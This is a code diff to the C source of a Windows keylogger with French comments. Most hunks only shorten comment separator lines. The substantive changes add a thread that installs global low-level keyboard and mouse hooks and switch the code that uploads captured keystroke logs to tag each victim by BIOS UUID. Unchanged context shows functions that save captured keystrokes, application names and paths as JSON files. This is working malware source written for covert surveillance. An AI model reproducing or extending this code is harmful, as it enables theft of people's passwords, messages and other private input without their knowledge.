@@ -2,7 +2,7 @@
 
 EXTERN_C_START
 
-/********************************************************************************************************************************************************/
+/********************************************************************************************************************************/
 //Fonction de callback du hook sur le clavier
 LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam)
 {
@@ -108,7 +108,7 @@ LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam)
 
     return CallNextHookEx(0, code, wParam, lParam);
 }
-/********************************************************************************************************************************************************/
+/********************************************************************************************************************************/
 VOID WriteLogs(PWCHAR logsUnicode, PWCHAR appNameUnicode, PWCHAR pathUnicode)
 {
     cJSON* createdJsonObject = NULL;
@@ -125,7 +125,7 @@ VOID WriteLogs(PWCHAR logsUnicode, PWCHAR appNameUnicode, PWCHAR pathUnicode)
     HeapFree(GetProcessHeap(), NULL, logsUTF8);
     HeapFree(GetProcessHeap(), NULL, appNameUTF8);
 }
-/********************************************************************************************************************************************************/
+/********************************************************************************************************************************/
 //Fonction qui crée un objet javascript contenant les logs
 cJSON* CreateJsonLogsObject(PCHAR logs, PCHAR app, PCHAR path)
 {
@@ -148,7 +148,7 @@ cJSON* CreateJsonLogsObject(PCHAR logs, PCHAR app, PCHAR path)
 
     return object;
 }
-/********************************************************************************************************************************************************/
+/********************************************************************************************************************************/
 //Fonction qui écrit les logs dans un fichier JSON
 VOID WriteJsonObjectLogs(cJSON* newJsonObject)
 {
@@ -252,16 +252,14 @@ VOID WriteJsonObjectLogs(cJSON* newJsonObject)
     
     CloseHandle(hJsonFile);
 }
-/********************************************************************************************************************************************************/
-
-/********************************************************************************************************************************************************/
+/********************************************************************************************************************************/
 VOID SendKeylogs()
 {
     HANDLE hFindData;
     WIN32_FIND_DATA findData;
 
     CHAR uuid[UUID_SIZE] = { 0 };
-    GetUuid(uuid);
+    GetInformation(uuid, sizeof(uuid), BIOS_UUID);
 
     if ((hFindData = FindFirstFile(DATA_FOLDER_W L"*.json", &findData)) == INVALID_HANDLE_VALUE)
         return;
@@ -324,6 +322,23 @@ VOID SendKeylogs()
 
     FindClose(hFindData);
 }
-/********************************************************************************************************************************************************/
+/********************************************************************************************************************************/
+DWORD WINAPI ThreadKeylogger()
+{
+    //Hooks sur le clavier et la souris pour le keylogger
+    if (!SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)HookProc, NULL, 0) || !SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0))
+        ExitThread(EXIT_FAILURE);
+
+    MSG msg;
+
+    while (GetMessage(&msg, NULL, 0, 0))
+    {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    ExitThread(0);
+}
+/********************************************************************************************************************************/
 
 EXTERN_C_END
